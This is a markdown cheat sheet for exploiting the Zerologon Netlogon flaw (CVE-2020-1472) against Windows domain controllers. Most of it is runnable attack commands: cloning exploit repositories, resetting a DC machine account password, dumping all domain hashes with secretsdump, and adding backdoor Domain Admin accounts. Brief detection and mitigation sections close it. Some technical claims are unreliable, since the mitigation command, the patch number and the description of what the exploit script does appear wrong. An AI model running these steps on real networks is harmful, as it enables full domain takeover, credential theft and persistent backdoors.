# ZEROLOGON (CVE-2020-1472) - NETLOGON PRIVILEGE ESCALATION

Critical vulnerability in Windows Netlogon RPC protocol allowing an attacker to set domain controller machine account password to empty. Results in complete domain compromise with unauthenticated access.

## Overview

- **CVE ID**: CVE-2020-1472
- **Affected Versions**: ALL Windows Server versions (2008-2022)
- **Impact**: Instant Domain Admin, complete domain compromise
- **Authentication**: Unauthenticated! 
- **Severity**: CRITICAL (CVSS 10.0 - Perfect Score)
- **Attack Complexity**: Very Low - single command

## Mechanism

The Netlogon[Secure Channel] protocol uses AES-CFB8 for encryption with a hardcoded IV (initialization vector) of all zeros. This allows an attacker to:

1. Send specially crafted RPC requests to DC Netlogon service
2. Bypass authentication checks
3. Change DC machine account password to be empty or guessable
4. Authenticate as SYSTEM using compromised DC account
5. Become domain admin instantly

## Exploitation

### Using dirkjanm Exploit (Most Reliable)

Repository: https://github.com/dirkjanm/CVE-2020-1472

```bash
git clone https://github.com/dirkjanm/CVE-2020-1472
cd CVE-2020-1472

python3 zerologon_tester.py DC-IP
```

### Check if DC is Vulnerable

```bash
python3 zerologon_tester.py 10.0.2.15
```

Output:
- `[+] VULNERABLE` = Immediately exploitable
- `[*] Test failed` = Patched or protected

### Exploit DC and Reset Machine Account

```bash
python3 cve_2020_1472_exploit.py MARVEL 10.0.2.15
```

This:
1. Resets DC machine account password to empty
2. Creates local admin account on DC
3. Dumps NTDS.dit

### Post-Exploitation: Restore and Maintain Access

```bash
# Dump NTDS.dit while DC is compromised
impacket-secretsdump MARVEL.local/MARVEL\$@10.0.2.15 -just-dc

# Create backdoor admin account
impacket-psexec -hashes :hash MARVEL.local/administrator@10.0.2.15
net user backdoor Password1 /add /domain
net group "Domain Admins" backdoor /add /domain

# Restore DC functionality (optional)
python3 restore_down_level_logon.py MARVEL 10.0.2.15
```

## Attack Flow

```
1. Attacker → Netlogon RPC ← Domain Controller
   ↓
2. Send 256+ empty credential requests
   ↓
3. DC accepts one (1 in 256 chance per attempt)
   ↓
4. Machine account password reset to ""
   ↓
5. Authenticate as MARVEL$ with empty password
   ↓
6. Dump NTDS.dit (all domain hashes)
   ↓
7. Create persistent backdoor accounts
   ↓
8. COMPLETE DOMAIN COMPROMISE
```

## Using bvcyber Alternative Exploit

Repository: https://github.com/bvcyber/CVE-2020-1472

```bash
git clone https://github.com/bvcyber/CVE-2020-1472
cd CVE-2020-1472

python3 zerologon.py -np -u root -p pass -ip 10.0.2.15
```

## Complete Exploitation Example

```bash
# 1. Test vulnerability
python3 zerologon_tester.py 10.0.2.15
# Output: [+] VULNERABLE | Ntp Enabled: False

# 2. Exploit and reset password
python3 cve_2020_1472_exploit.py MARVEL 10.0.2.15

# 3. Dump all domain credentials
impacket-secretsdump MARVEL.local/MARVEL\$:@10.0.2.15 -just-dc

# 4. Create persistent admin account
impacket-psexec -hashes :DCNTHASH MARVEL.local/administrator@10.0.2.15
net user hacker P@ssw0rd123 /add /domain
net group "Domain Admins" hacker /add /domain

# 5. Domain is now fully compromised
```

## Why It's So Dangerous

- **Unauthenticated**: No credentials needed at all
- **Immediate**: Takes seconds to execute
- **Undetectable**: Minimal logs (maybe Event ID 4742)
- **Complete**: DC machine account compromise = domain admin
- **Affects ALL Windows**: Even latest patched systems if not updated
- **Easy Tools**: Simple Python scripts anyone can run

## Detection

Look for:
- Unusual Netlogon RPC activity
- DC machine account password changes (Event ID 4742)
- Multiple failed Netlogon authentication attempts
- Privileged account creation right after exploitation
- Security log entries with Event IDs: 4672, 4722, 4742

Event ID 4742 - Computer account was changed:
- Unexpected DC password resets
- Check for manual password changes on DC$ account

## Mitigation

**APPLY PATCH IMMEDIATELY** - This is non-negotiable

```bash
# Windows Update
dism /online /enable-feature /featurename:NetLogonPacket /norestart
```

Windows Update KB4787558+ (Monthly security updates)

- Update ALL Windows servers and domain controllers
- Enable NetLogon packet signing in group policy
- Implement network segmentation (restrict DC access)
- Monitor Netlogon service activity
- Implement attack surface reduction rules
- Require strong DC machine account passwords (not empty)

## References

- **Microsoft Security Advisory**: https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-1472
- **Technical Deep Dive**: https://www.trendmicro.com/en_us/what-is/zerologon.html
- **Full Exploit Details**: https://github.com/dirkjanm/CVE-2020-1472